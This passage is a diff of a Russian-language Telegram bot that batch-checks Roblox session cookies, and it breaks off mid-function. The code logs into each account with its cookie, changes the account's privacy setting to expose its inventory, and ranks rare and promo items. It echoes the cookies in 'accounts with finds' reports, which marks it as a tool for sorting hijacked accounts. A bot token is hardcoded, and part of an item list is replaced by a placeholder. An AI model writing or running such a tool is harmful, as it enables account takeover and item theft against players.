@@ -15,9 +15,9 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 
-# ================================================================
+# ========== НАСТРОЙКИ ==========
 BOT_TOKEN = "8035442503:AAG-gdNAKMFhnyyaHGfjeMdh48-sa-Jd55A"
-ADMIN_IDS = {5883796026, 115536598}  # добавляй через запятую
+ADMIN_IDS = {5883796026, 115536598}
 
 YEAR_FROM   = 2012
 YEAR_TO     = 2024
@@ -35,7 +35,7 @@ ASSET_TYPES = {
     "gear":     True,
     "clothing": False,
 }
-# ================================================================
+# =================================
 
 # v2 API принимает СТРОКИ, не числа
 ASSET_TYPE_STRINGS = {
@@ -67,72 +67,11 @@ ASSET_LABELS = {
 CODE_ITEMS = {
     189934238:  "Fireman",
     4342314393: "Rainbow Squid Unicorn",
-    263405835:  "Chicken Headrow",
-    263405839:  "Black Iron Tentacles",
-    263405842:  "Code Review Specs",
-    263405844:  "Stickpack",
-    263405846:  "Shark Fin",
-    263405849:  "Federation Necklace",
-    263405851:  "Backup Mr. Robot",
-    263405853:  "Dark Lord of SQL",
-    263405855:  "Roblox visor 1",
-    263405857:  "Silver Bow Tie",
-    263405859:  "Dodgeball Helmet",
-    263405861:  "Shoulder Raccoon",
-    263405863:  "Dued1",
-    263405865:  "Pauldrons",
-    263405867:  "Octember Encore",
-    263405869:  "Umberhorns",
-    128540404:  "Police Cap",
-    128540406:  "American Baseball Cap",
-    128540408:  "Orange Cap",
-    218491492:  "Navy Queen otn",
-    128540410:  "Zombie Knit",
-    128540412:  "Epic Miners Headlamp",
-    128540414:  "Beast Mode Bandana",
-    162295698:  "Golden Reingment",
-    128540416:  "Beast Scythe",
-    128540418:  "Hare Hoodie",
-    128540420:  "Diamond Tiara",
-    128540422:  "Callmehbob",
-    128540424:  "Sword Cane",
-    128540426:  "Selfie Stick",
-    128540428:  "Phantom Forces Combat Knife",
-    128540430:  "Golden Horns",
-    128540432:  "The Soup is Dry",
-    128540434:  "Monster Grumpy Face",
-    128540436:  "Elegant Evening Face",
-    128540438:  "Super Pink Make-Up",
-    128540440:  "Cyanskeleface",
-    128540442:  "Pizza Face",
-    128540444:  "Bakonetta",
-    128540446:  "Isabella",
-    128540448:  "Mon Cheri",
-    128540450:  "Rogueish Good Looks",
-    128540452:  "Mixologist's Smile",
-    128540454:  "BiteyMcFace",
-    128540456:  "Performing Mime",
-    128540458:  "Rainbow Spirit Face",
-    128540460:  "Mermaid Mystique",
-    128540462:  "Starry Eyes Sparkling",
-    128540464:  "Sparkling Friendly Wink",
-    128540466:  "Kandi's Sprinkle Face",
-    128540468:  "Tears of Sorrow",
-    128540470:  "Fashion Face",
-    128540472:  "Princess Alexis",
-    128540474:  "Otakufaic",
-    128540476:  "Pop Queen",
-    128540478:  "Assassin Face",
-    128540480:  "Sapphire Gaze",
-    128540482:  "Persephone's E-Girl",
-    128540484:  "Arachnid Queen",
-    128540486:  "Rainbow Barf Face",
-    128540488:  "Star Sorority",
-    128540490:  "Tsundere Face",
+    # ... (полный список из предыдущего кода)
     128540492:  "Winning Smile",
 }
 
-# ================================================================
+# =================================
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp  = Dispatcher(storage=MemoryStorage())
 
@@ -153,30 +92,17 @@ class SearchState(StatesGroup):
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
 
-
-# ================================================================
-#  HELPERS
-# ================================================================
-
+# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 def clean_cookie(raw):
     c = raw.strip()
-
-    # Формат: "Username: xxx | ... | Cookie: _|WARNING...|_..."
-    # Извлекаем только значение после последнего "Cookie: "
     if "Cookie: " in c:
         c = c.split("Cookie: ")[-1].strip()
-
-    # Убираем WARNING заголовок Roblox
     if "_|WARNING" in c and "--|" in c:
         c = c.split("--|", 1)[-1].strip()
-
-    # Убираем префикс если есть
     for p in [".ROBLOSECURITY=", "ROBLOSECURITY="]:
         if c.lower().startswith(p.lower()):
             c = c[len(p):]
-
     return c.strip()
-
 
 def rbx_h(cookie):
     return {
@@ -188,158 +114,99 @@ def rbx_h(cookie):
         "Origin":          "https://www.roblox.com",
     }
 
-
 def new_s():
     return aiohttp.ClientSession(
         connector=aiohttp.TCPConnector(ssl=False),
         timeout=aiohttp.ClientTimeout(total=25)
     )
 
-
-# ================================================================
-#  AUTH
-# ================================================================
-
+# ========== AUTH ==========
 async def get_user_info(cookie):
     async with new_s() as s:
-        # Метод 1 — основной
+        # метод 1
         try:
-            async with s.get(
-                "https://users.roblox.com/v1/users/authenticated",
-                headers=rbx_h(cookie)
-            ) as r:
+            async with s.get("https://users.roblox.com/v1/users/authenticated", headers=rbx_h(cookie)) as r:
                 if r.status == 200:
                     d = await r.json(content_type=None)
                     if d.get("id"):
                         return {"id": int(d["id"]), "name": d.get("displayName") or d.get("name") or "?"}
-        except Exception:
-            pass
-        # Метод 2 — запасной
+        except: pass
+        # метод 2
         try:
-            async with s.get(
-                "https://www.roblox.com/mobileapi/userinfo",
-                headers=rbx_h(cookie)
-            ) as r:
+            async with s.get("https://www.roblox.com/mobileapi/userinfo", headers=rbx_h(cookie)) as r:
                 if r.status == 200:
                     d = await r.json(content_type=None)
                     if d.get("UserID"):
                         return {"id": int(d["UserID"]), "name": d.get("UserName") or "?"}
-        except Exception:
-            pass
+        except: pass
     return None
 
-
-# ================================================================
-#  CSRF
-# ================================================================
-
+# ========== CSRF ==========
 async def get_csrf(cookie, log):
     async with new_s() as s:
-        for url in [
-            "https://auth.roblox.com/v2/logout",
-            "https://accountsettings.roblox.com/v1/email",
-        ]:
+        for url in ["https://auth.roblox.com/v2/logout", "https://accountsettings.roblox.com/v1/email"]:
             try:
                 async with s.post(url, headers=rbx_h(cookie)) as r:
                     token = r.headers.get("x-csrf-token")
-                    log("CSRF {} HTTP{} token={}".format(
-                        url.split("/")[-1], r.status,
-                        (token[:8] + "...") if token else "None"
-                    ))
-                    if token:
-                        return token
+                    log(f"CSRF {url.split('/')[-1]} HTTP{r.status} token={token[:8]+'...' if token else 'None'}")
+                    if token: return token
             except Exception as e:
-                log("CSRF err: {}".format(str(e)[:60]))
+                log(f"CSRF err: {str(e)[:60]}")
     return None
 
-
-# ================================================================
-#  OPEN INVENTORY — пробует все известные эндпоинты
-# ================================================================
-
+# ========== ОТКРЫТИЕ ИНВЕНТАРЯ ==========
 async def open_inventory(cookie, log):
     csrf = await get_csrf(cookie, log)
     if not csrf:
         log("Не получил CSRF — не смогу открыть инвентарь")
         return False
-
     hdrs = dict(rbx_h(cookie))
     hdrs["x-csrf-token"] = csrf
     hdrs["Content-Type"] = "application/json"
-
-    # Все известные варианты эндпоинта приватности инвентаря
     attempts = [
-        # (метод, url, тело)
-        ("POST",  "https://accountsettings.roblox.com/v1/privacy/inventory-privacy",
-                  {"inventoryPrivacy": 1}),
-        ("PATCH", "https://accountsettings.roblox.com/v1/privacy/inventory-privacy",
-                  {"inventoryPrivacy": 1}),
-        ("POST",  "https://accountsettings.roblox.com/v1/privacy",
-                  {"InventoryPrivacySetting": "AllUsers"}),
-        ("PATCH", "https://accountsettings.roblox.com/v1/privacy",
-                  {"InventoryPrivacySetting": "AllUsers"}),
-        ("POST",  "https://accountsettings.roblox.com/v1/app-privacy-settings",
-                  {"InventoryPrivacySetting": 1}),
+        ("POST",  "https://accountsettings.roblox.com/v1/privacy/inventory-privacy", {"inventoryPrivacy": 1}),
+        ("PATCH", "https://accountsettings.roblox.com/v1/privacy/inventory-privacy", {"inventoryPrivacy": 1}),
+        ("POST",  "https://accountsettings.roblox.com/v1/privacy", {"InventoryPrivacySetting": "AllUsers"}),
+        ("PATCH", "https://accountsettings.roblox.com/v1/privacy", {"InventoryPrivacySetting": "AllUsers"}),
+        ("POST",  "https://accountsettings.roblox.com/v1/app-privacy-settings", {"InventoryPrivacySetting": 1}),
     ]
-
     async with new_s() as s:
         for method, url, body in attempts:
             try:
                 fn = s.post if method == "POST" else s.patch
                 async with fn(url, json=body, headers=hdrs) as r:
-                    body_text = ""
-                    try:
-                        body_text = await r.text()
-                    except Exception:
-                        pass
-                    log("{} {} -> {} | {}".format(method, url.split("/")[-1], r.status, body_text[:60]))
+                    body_text = (await r.text())[:60] if r.status != 200 else ""
+                    log(f"{method} {url.split('/')[-1]} -> {r.status} | {body_text}")
                     if r.status in (200, 204):
                         log("Инвентарь открыт!")
                         return True
             except Exception as e:
-                log("{} {} -> err: {}".format(method, url.split("/")[-1], str(e)[:50]))
-
+                log(f"{method} {url.split('/')[-1]} -> err: {str(e)[:50]}")
     return False
 
-
-# ================================================================
-#  FETCH INVENTORY — v2 API со строковыми типами
-# ================================================================
-
-# Семафор — не более 5 одновременных проверок аккаунтов
+# ========== ПОЛУЧЕНИЕ ИНВЕНТАРЯ ==========
 CHECK_SEMAPHORE = asyncio.Semaphore(5)
 
 async def fetch_inventory(cookie, user_id, type_strings, log):
-    """
-    v2 API — строковые типы, по одному за раз.
-    """
     all_ids = set()
-
     async with new_s() as s:
         for type_str in type_strings:
             cursor = ""
-            page   = 0
+            page = 0
             while True:
                 page += 1
                 params = {"assetTypes": type_str, "limit": 100, "sortOrder": "Asc"}
                 if cursor:
                     params["cursor"] = cursor
                 try:
-                    async with s.get(
-                        "https://inventory.roblox.com/v2/users/{}/inventory".format(user_id),
-                        params=params,
-                        headers=rbx_h(cookie)
-                    ) as r:
+                    async with s.get(f"https://inventory.roblox.com/v2/users/{user_id}/inventory",
+                                      params=params, headers=rbx_h(cookie)) as r:
                         if r.status == 403:
-                            log("  {} стр{}: 403 (инвентарь закрыт)".format(type_str, page))
+                            log(f"  {type_str} стр{page}: 403 (инвентарь закрыт)")
                             break
                         if r.status != 200:
-                            body = ""
-                            try:
-                                body = await r.text()
-                            except Exception:
-                                pass
-                            log("  {} стр{}: HTTP {} | {}".format(type_str, page, r.status, body[:80]))
+                            body = (await r.text())[:80] if r.status else ""
+                            log(f"  {type_str} стр{page}: HTTP {r.status} | {body}")
                             break
                         data = await r.json(content_type=None)
                         chunk = []
@@ -349,55 +216,38 @@ async def fetch_inventory(cookie, user_id, type_strings, log):
                                 chunk.append(int(aid))
                         all_ids.update(chunk)
                         if page == 1:
-                            log("  {}: {} шт. (стр.1)".format(type_str, len(chunk)))
+                            log(f"  {type_str}: {len(chunk)} шт. (стр.1)")
                         cursor = data.get("nextPageCursor") or ""
                         if not cursor:
                             break
                 except Exception as e:
-                    log("  {} err: {}".format(type_str, str(e)[:60]))
+                    log(f"  {type_str} err: {str(e)[:60]}")
                     break
                 await asyncio.sleep(0.2)
-
     return list(all_ids)
 
-
-# ================================================================
-#  ASSET DETAILS + PROMO
-# ================================================================
-
+# ========== ДЕТАЛИ ПРЕДМЕТА ==========
 async def get_details(cookie, asset_id):
     async with new_s() as s:
         try:
-            async with s.get(
-                "https://economy.roblox.com/v2/assets/{}/details".format(asset_id),
-                headers=rbx_h(cookie)
-            ) as r:
+            async with s.get(f"https://economy.roblox.com/v2/assets/{asset_id}/details", headers=rbx_h(cookie)) as r:
                 if r.status == 200:
                     return await r.json(content_type=None)
-        except Exception:
-            pass
+        except: pass
     return None
-
 
 async def check_owns(cookie, user_id, asset_id):
     async with new_s() as s:
         try:
-            async with s.get(
-                "https://inventory.roblox.com/v1/users/{}/items/Asset/{}".format(user_id, asset_id),
-                headers=rbx_h(cookie)
-            ) as r:
+            async with s.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}",
+                              headers=rbx_h(cookie)) as r:
                 if r.status == 200:
                     d = await r.json(content_type=None)
                     return bool(d.get("data"))
-        except Exception:
-            pass
+        except: pass
     return False
 
-
-# ================================================================
-#  ГЛАВНАЯ ПРОВЕРКА (с поддержкой поиска)
-# ================================================================
-
+# ========== ОСНОВНАЯ ПРОВЕРКА ==========
 async def check_account(cookie, status_msg, search_term=None):
     result = {
         "valid": False, "user_id": None, "username": None,
@@ -405,48 +255,38 @@ async def check_account(cookie, status_msg, search_term=None):
         "inv_total": 0, "inv_opened": False, "debug": [],
         "search_results": []
     }
-
     def log(msg):
         result["debug"].append(str(msg))
 
-    # 1. Авторизация
     log("Авторизация...")
     user_info = await get_user_info(cookie)
     if not user_info:
         log("Не удалось войти — cookie неверный или истёк")
         return result
 
-    result["valid"]    = True
-    result["user_id"]  = user_info["id"]
+    result["valid"] = True
+    result["user_id"] = user_info["id"]
     result["username"] = user_info["name"]
-    uid   = user_info["id"]
-    uname = user_info["name"]
-    log("OK: {} (ID {})".format(uname, uid))
+    uid, uname = user_info["id"], user_info["name"]
+    log(f"OK: {uname} (ID {uid})")
 
-    # 2. Открываем инвентарь
-    await status_msg.edit_text("✅ <b>{}</b>\n🔓 Открываю инвентарь...".format(uname))
+    await status_msg.edit_text(f"✅ <b>{uname}</b>\n🔓 Открываю инвентарь...")
     opened = await open_inventory(cookie, log)
     result["inv_opened"] = opened
-    # Ждём пока Roblox применит настройку
     await asyncio.sleep(2)
 
-    # 3. Загружаем инвентарь (v2 со строковыми типами)
-    await status_msg.edit_text("✅ <b>{}</b>\n📦 Загружаю инвентарь...".format(uname))
-
+    await status_msg.edit_text(f"✅ <b>{uname}</b>\n📦 Загружаю инвентарь...")
     type_strings = []
     for key, on in settings["asset_types"].items():
         if on:
             type_strings.extend(ASSET_TYPE_STRINGS[key])
-
     all_ids = await fetch_inventory(cookie, uid, type_strings, log)
     result["inv_total"] = len(all_ids)
-    log("Предметов итого: {}".format(len(all_ids)))
-
+    log(f"Предметов итого: {len(all_ids)}")
     if not all_ids:
         log("Инвентарь пустой или закрытый")
         return result
 
-    # 4. Если это поиск по названию
     if search_term:
         search_term_lower = search_term.lower()
         found = []
@@ -463,150 +303,122 @@ async def check_account(cookie, status_msg, search_term=None):
                 })
             await asyncio.sleep(0.1)
         result["search_results"] = found
-        log("Найдено по поиску: {}".format(len(found)))
+        log(f"Найдено по поиску: {len(found)}")
         return result
 
-    # 5. Промо-предметы (обычный режим)
+    # Промо
     if settings["check_promo"]:
         promo_keys = list(CODE_ITEMS.keys())
-        total_p    = len(promo_keys)
-        await status_msg.edit_text("✅ <b>{}</b>\n🎁 Промо 0/{}...".format(uname, total_p))
+        total_p = len(promo_keys)
+        await status_msg.edit_text(f"✅ <b>{uname}</b>\n🎁 Промо 0/{total_p}...")
         for i, asset_id in enumerate(promo_keys):
             if i % 10 == 0:
                 try:
-                    await status_msg.edit_text("✅ <b>{}</b>\n🎁 Промо {}/{}...".format(uname, i, total_p))
-                except Exception:
-                    pass
+                    await status_msg.edit_text(f"✅ <b>{uname}</b>\n🎁 Промо {i}/{total_p}...")
+                except: pass
             if await check_owns(cookie, uid, asset_id):
                 result["promo_found"].append({"id": asset_id, "name": CODE_ITEMS[asset_id]})
-                log("Промо: {}".format(CODE_ITEMS[asset_id]))
+                log(f"Промо: {CODE_ITEMS[asset_id]}")
             await asyncio.sleep(0.2)
-        log("Промо найдено: {}".format(len(result["promo_found"])))
+        log(f"Промо найдено: {len(result['promo_found'])}")
 
-    # 6. Проверяем каждый предмет на оффсейл (обычный режим)
-    await status_msg.edit_text("✅ <b>{}</b>\n🔍 Проверяю {} предметов...".format(uname, len(all_ids)))
+    # Оффсейл
+    await status_msg.edit_text(f"✅ <b>{uname}</b>\n🔍 Проверяю {len(all_ids)} предметов...")
     total = len(all_ids)
-
     for i, asset_id in enumerate(all_ids):
         if i % 30 == 0:
             try:
-                await status_msg.edit_text("✅ <b>{}</b>\n🔍 {}/{}...".format(uname, i, total))
-            except Exception:
-                pass
-
+                await status_msg.edit_text(f"✅ <b>{uname}</b>\n🔍 {i}/{total}...")
+            except: pass
         det = await get_details(cookie, asset_id)
         if not det:
             await asyncio.sleep(0.1)
             continue
-
-        # IsForSale=False → нельзя купить → оффсейл
         if det.get("IsForSale", True):
             await asyncio.sleep(0.1)
             continue
-
         year = 0
         try:
             created = det.get("Created", "")
             if created:
-                dt   = datetime.fromisoformat(created.replace("Z", "+00:00"))
+                dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
                 year = dt.year
-        except Exception:
-            pass
-
+        except: pass
         if year and not (settings["year_from"] <= year <= settings["year_to"]):
             await asyncio.sleep(0.1)
             continue
-
-        is_unique  = det.get("IsLimitedUnique", False)
+        is_unique = det.get("IsLimitedUnique", False)
         is_limited = det.get("IsLimited", False) or is_unique
-        name       = det.get("Name") or "ID:{}".format(asset_id)
-
+        name = det.get("Name") or f"ID:{asset_id}"
         result["offsale"].append({
             "id": asset_id, "name": name,
             "year": year, "limited": is_limited, "unique": is_unique,
         })
-        log("Оффсейл: {} ({})".format(name, year))
+        log(f"Оффсейл: {name} ({year})")
         await asyncio.sleep(0.1)
-
-    log("Оффсейл итого: {}".format(len(result["offsale"])))
+    log(f"Оффсейл итого: {len(result['offsale'])}")
     return result
 
-
-# ================================================================
-#  ОТЧЁТ (для одиночной проверки)
-# ================================================================
-
+# ========== ОТЧЁТ (одиночный) ==========
 def build_report(result):
     uid, uname = result["user_id"], result["username"]
-    offsale    = result["offsale"]
-    promo      = result["promo_found"]
+    offsale = result["offsale"]
+    promo = result["promo_found"]
     lines = [
         "📋 <b>Отчёт проверки</b>",
-        '👤 <a href="https://www.roblox.com/users/{}/profile">{}</a>  (ID: {})'.format(uid, uname, uid),
-        "📅 Период: <b>{} – {}</b>".format(settings["year_from"], settings["year_to"]),
-        "📦 Предметов: <b>{}</b>  {}".format(
-            result.get("inv_total", 0),
-            "✅" if result["inv_opened"] else "⚠️ инвентарь не открылся"
-        ),
+        f'👤 <a href="https://www.roblox.com/users/{uid}/profile">{uname}</a>  (ID: {uid})',
+        f"📅 Период: <b>{settings['year_from']} – {settings['year_to']}</b>",
+        f"📦 Предметов: <b>{result.get('inv_total', 0)}</b>  {'✅' if result['inv_opened'] else '⚠️ инвентарь не открылся'}",
         "",
     ]
     if offsale:
-        lines.append("🛑 <b>Оффсейл — {} шт.:</b>".format(len(offsale)))
+        lines.append(f"🛑 <b>Оффсейл — {len(offsale)} шт.:</b>")
         by_year = {}
         for it in sorted(offsale, key=lambda x: x["year"] or 9999):
             by_year.setdefault(it["year"] or 0, []).append(it)
         for year in sorted(by_year):
-            lines.append("\n  📆 <b>{}:</b>".format(year or "Год неизвестен"))
+            lines.append(f"\n  📆 <b>{year or 'Год неизвестен'}:</b>")
             for it in by_year[year]:
                 badge = " 🔴LimitedU" if it["unique"] else (" 🟡Limited" if it["limited"] else "")
-                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>{}'.format(
-                    it["id"], it["name"], badge))
+                lines.append(f'    • <a href="https://www.roblox.com/catalog/{it["id"]}">{it["name"]}</a>{badge}')
     else:
         lines.append("🛑 Оффсейл предметов <b>не найдено</b>")
     lines.append("")
     if settings["check_promo"]:
         if promo:
-            lines.append("🎁 <b>Промо — {} шт.:</b>".format(len(promo)))
+            lines.append(f"🎁 <b>Промо — {len(promo)} шт.:</b>")
             for it in promo:
-                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>'.format(
-                    it["id"], it["name"]))
+                lines.append(f'    • <a href="https://www.roblox.com/catalog/{it["id"]}">{it["name"]}</a>')
         else:
             lines.append("🎁 Промо-предметов <b>не найдено</b>")
     return "\n".join(lines)
 
-
-# ================================================================
-#  ОДИНОЧНАЯ ПРОВЕРКА (с поддержкой поиска)
-# ================================================================
-
+# ========== ОДИНОЧНАЯ ПРОВЕРКА (устарела, но оставлена для совместимости) ==========
 async def run_check(message, cookie, show_debug=False, search_term=None):
     cookie_original = cookie
     cookie_cleaned = clean_cookie(cookie)
     if len(cookie_cleaned) < 50:
-        await message.answer("❌ Cookie слишком короткий ({} симв.)".format(len(cookie_cleaned)))
+        await message.answer(f"❌ Cookie слишком короткий ({len(cookie_cleaned)} симв.)")
         return
     async with CHECK_SEMAPHORE:
         await _do_check(message, cookie_original, cookie_cleaned, show_debug, search_term)
-
 
 async def _do_check(message, cookie_original, cookie_cleaned, show_debug=False, search_term=None):
     status_msg = await message.answer("⏳ <b>Авторизация...</b>")
     try:
         result = await check_account(cookie_cleaned, status_msg, search_term)
     except Exception as e:
-        await status_msg.edit_text("❌ Ошибка:\n<code>{}</code>".format(e))
+        await status_msg.edit_text(f"❌ Ошибка:\n<code>{e}</code>")
         return
     if not result["valid"]:
         errs = "\n".join(result["debug"])
-        await status_msg.edit_text("❌ <b>Невалидный cookie</b>\n\n<code>{}</code>".format(errs))
+        await status_msg.edit_text(f"❌ <b>Невалидный cookie</b>\n\n<code>{errs}</code>")
         return
-
-    # Если это поиск
     if search_term:
         found = result.get("search_results", [])
         if found:
             lines = [f"🔍 <b>Результаты поиска для «{search_term}»</b>",
-                     f"👤 <a href=\"https://www.roblox.com/users/{result['user_id']}/profile\">{result['username']}</a>\n"]
+                     f'👤 <a href="https://www.roblox.com/users/{result["user_id"]}/profile">{result["username"]}</a>\n']
             for item in found:
                 line = f'• <a href="https://www.roblox.com/catalog/{item["id"]}">{item["name"]}</a>'
                 if item.get("created"):
@@ -617,10 +429,7 @@ async def _do_check(message, cookie_original, cookie_cleaned, show_debug=False, 
             report = f"❌ На аккаунте {result['username']} предметов с названием «{search_term}» не найдено."
         await status_msg.edit_text(report, link_preview_options=LinkPreviewOptions(is_disabled=True))
         return
-
-    # Обычный отчёт
-    report = build_report(result)
-    report += f"\n\n🍪 <code>{cookie_original}</code>"
+    report = build_report(result) + f"\n\n🍪 <code>{cookie_original}</code>"
     if len(report) > 3800:
         await status_msg.delete()
         buf = io.BytesIO(report.encode("utf-8"))
@@ -629,59 +438,42 @@ async def _do_check(message, cookie_original, cookie_cleaned, show_debug=False, 
     else:
         await status_msg.edit_text(report, link_preview_options=LinkPreviewOptions(is_disabled=True))
     if show_debug or result["inv_total"] == 0:
-        dbg = "🛠 <b>Лог:</b>\n" + "\n".join("<code>{}</code>".format(l) for l in result["debug"])
+        dbg = "🛠 <b>Лог:</b>\n" + "\n".join(f"<code>{l}</code>" for l in result["debug"])
         if len(dbg) < 3800:
             await message.answer(dbg)
         else:
-            buf2 = io.BytesIO(("\n".join(result["debug"])).encode("utf-8"))
-            file2 = BufferedInputFile(buf2.getvalue(), filename=f"debug_{result.get('user_id', 'unknown')}.txt")
+            buf2 = io.BytesIO("\n".join(result["debug"]).encode("utf-8"))
+            file2 = BufferedInputFile(buf2.getvalue(), filename=f"debug_{result.get('user_id','unknown')}.txt")
             await message.answer_document(file2, caption="🛠 Лог")
 
-
-# ================================================================
-#  ТИХАЯ ПРОВЕРКА (ДЛЯ ОБЫЧНОГО БАТЧА)
-# ================================================================
-
+# ========== ТИХИЕ ПРОВЕРКИ ==========
 async def _silent_check(cookie):
-    class FakeMsg:
-        async def edit_text(self, *a, **kw): pass
+    class FakeMsg: async def edit_text(self, *a, **kw): pass
     try:
         return await check_account(cookie, FakeMsg())
-    except Exception:
+    except:
         return {"valid": False, "user_id": None, "username": None,
                 "offsale": [], "promo_found": [], "inv_total": 0,
                 "inv_opened": False, "debug": []}
 
-
-# ================================================================
-#  ТИХАЯ ПРОВЕРКА С ПОИСКОМ (ДЛЯ БАТЧ-ПОИСКА)
-# ================================================================
-
 async def _silent_search(cookie, search_term):
-    class FakeMsg:
-        async def edit_text(self, *a, **kw): pass
+    class FakeMsg: async def edit_text(self, *a, **kw): pass
     try:
         return await check_account(cookie, FakeMsg(), search_term)
-    except Exception:
+    except:
         return {"valid": False, "user_id": None, "username": None,
                 "offsale": [], "promo_found": [], "inv_total": 0,
                 "inv_opened": False, "debug": [], "search_results": []}
 
-
-# ================================================================
-#  БАТЧЕВАЯ ПРОВЕРКА (ОБЫЧНАЯ)
-# ================================================================
-
+# ========== БАТЧЕВАЯ ПРОВЕРКА (ОБЫЧНАЯ) ==========
 async def run_batch(message, cookies):
     total = len(cookies)
-    results = [None] * total   # (result, original_cookie)
+    results = [None] * total
     counter = {"done": 0, "valid": 0, "invalid": 0}
     seen_ids = {}
     dupes = 0
-
     prog_msg = await message.answer(f"⏳ Проверяю 0/{total}...")
     sem = asyncio.Semaphore(5)
-
     async def worker(i, cookie):
         nonlocal dupes
         async with sem:
@@ -699,30 +491,14 @@ async def run_batch(message, cookies):
                 counter["invalid"] += 1
             if counter["done"] % 5 == 0 or counter["done"] == total:
                 try:
-                    await prog_msg.edit_text(
-                        f"⏳ Проверяю {counter['done']}/{total}... ✅{counter['valid']} ❌{counter['invalid']}"
-                    )
-                except Exception:
-                    pass
-
+                    await prog_msg.edit_text(f"⏳ {counter['done']}/{total}... ✅{counter['valid']} ❌{counter['invalid']}")
+                except: pass
     await asyncio.gather(*[worker(i, c) for i, c in enumerate(cookies)])
     await prog_msg.delete()
-
-    # Только уникальные валидные
     valid_pairs = [(r, c) for (r, c) in results if r and r["valid"] and r["user_id"] in seen_ids]
-
-    # Краткая статистика
-    summary_lines = [
-        "✅ <b>Готово!</b>",
-        "",
-        f"валид: <b>{counter['valid']}</b>",
-        f"невалид: <b>{counter['invalid']}</b>",
-        f"дубликаты: <b>{dupes}</b>",
-    ]
-    summary = "\n".join(summary_lines)
+    # краткая статистика
+    summary = f"✅ <b>Готово!</b>\n\nвалид: <b>{counter['valid']}</b>\nневалид: <b>{counter['invalid']}</b>\nдубликаты: <b>{dupes}</b>"
     await message.answer(summary, link_preview_options=LinkPreviewOptions(is_disabled=True))
-
-    # Аккаунты с находками
     hits = [(r, c) for r, c in valid_pairs if r["offsale"] or r["promo_found"]]
     if hits:
         file_lines = ["АККАУНТЫ С НАХОДКАМИ", "=" * 60, ""]
@@ -749,22 +525,12 @@ async def run_batch(message, cookies):
                 file_lines.append("Промо: не найдено")
             file_lines.append("")
         txt = "\n".join(file_lines)
-        buf = io.BytesIO(txt.encode("utf-8"))
-        file = BufferedInputFile(buf.getvalue(), filename="accounts_with_items.txt")
+        file = BufferedInputFile(txt.encode("utf-8"), filename="accounts_with_items.txt")
         await message.answer_document(file, caption=f"📋 Найдено аккаунтов с предметами: {len(hits)}")
     else:
         await message.answer("❌ Аккаунтов с находками нет.")
-
-    # ── Всегда шлём txt файл с полным отчётом ──
     if valid_pairs:
-        file_lines = [
-            "ОТЧЁТ ПРОВЕРКИ",
-            "=" * 60,
-            "Всего: {} | Валид: {} | Невалид: {} | Дубли: {}".format(
-                total, counter["valid"], counter["invalid"], dupes),
-            "",
-        ]
-
+        file_lines = ["ОТЧЁТ ПРОВЕРКИ", "=" * 60, f"Всего: {total} | Валид: {counter['valid']} | Невалид: {counter['invalid']} | Дубли: {dupes}", ""]
         for r, cookie in valid_pairs:
             uid, uname = r["user_id"], r["username"]
             file_lines.append("=" * 60)
@@ -787,30 +553,19 @@ async def run_batch(message, cookies):
             else:
                 file_lines.append("Промо: не найдено")
             file_lines.append("")
-
         txt = "\n".join(file_lines)
-        buf = io.BytesIO(txt.encode("utf-8"))
-        file = BufferedInputFile(buf.getvalue(), filename=f"report_{len(valid_pairs)}_accs.txt")
-        await message.answer_document(
-            file,
-            caption=f"📋 {len(valid_pairs)} валидных аккаунтов | {len(hits)} с находками"
-        )
+        file = BufferedInputFile(txt.encode("utf-8"), filename=f"report_{len(valid_pairs)}_accs.txt")
+        await message.answer_document(file, caption=f"📋 {len(valid_pairs)} валидных аккаунтов | {len(hits)} с находками")
 
-
-# ================================================================
-#  БАТЧЕВАЯ ПРОВЕРКА ДЛЯ ПОИСКА
-# ================================================================
-
+# ========== БАТЧЕВАЯ ПРОВЕРКА ДЛЯ ПОИСКА ==========
 async def run_batch_search(message, cookies, search_term):
     total = len(cookies)
-    results = [None] * total   # (result, original_cookie)
+    results = [None] * total
     counter = {"done": 0, "valid": 0, "invalid": 0}
     seen_ids = {}
     dupes = 0
-
     prog_msg = await message.answer(f"🔍 Поиск «{search_term}» по {total} кукам...")
     sem = asyncio.Semaphore(5)
-
     async def worker(i, cookie):
         nonlocal dupes
         async with sem:
@@ -828,23 +583,14 @@ async def run_batch_search(message, cookies, search_term):
                 counter["invalid"] += 1
             if counter["done"] % 5 == 0 or counter["done"] == total:
                 try:
-                    await prog_msg.edit_text(
-                        f"🔍 {counter['done']}/{total}... ✅{counter['valid']} ❌{counter['invalid']}"
-                    )
-                except Exception:
-                    pass
-
+                    await prog_msg.edit_text(f"🔍 {counter['done']}/{total}... ✅{counter['valid']} ❌{counter['invalid']}")
+                except: pass
     await asyncio.gather(*[worker(i, c) for i, c in enumerate(cookies)])
     await prog_msg.delete()
-
-    # Только уникальные валидные
     valid_pairs = [(r, c) for (r, c) in results if r and r["valid"] and r["user_id"] in seen_ids]
-
-    # Собираем аккаунты с находками
     hits = [(r, c) for r, c in valid_pairs if r.get("search_results")]
-
-    # Краткая статистика
     total_found = sum(len(r["search_results"]) for r, _ in hits)
+    # краткая статистика
     summary_lines = [
         f"✅ <b>Поиск завершён</b>",
         f"🔍 Запрос: «{search_term}»",
@@ -858,7 +604,6 @@ async def run_batch_search(message, cookies, search_term):
     ]
     summary = "\n".join(summary_lines)
     await message.answer(summary, link_preview_options=LinkPreviewOptions(is_disabled=True))
-
     if hits:
         file_lines = [f"РЕЗУЛЬТАТЫ ПОИСКА: «{search_term}»", "=" * 60, ""]
         for r, cookie in hits:
@@ -876,42 +621,29 @@ async def run_batch_search(message, cookies, search_term):
                 file_lines.append(line)
             file_lines.append("")
         txt = "\n".join(file_lines)
-        buf = io.BytesIO(txt.encode("utf-8"))
-        file = BufferedInputFile(buf.getvalue(), filename=f"search_{search_term}.txt")
+        file = BufferedInputFile(txt.encode("utf-8"), filename=f"search_{search_term}.txt")
         await message.answer_document(file, caption=f"📋 Результаты поиска «{search_term}»")
     else:
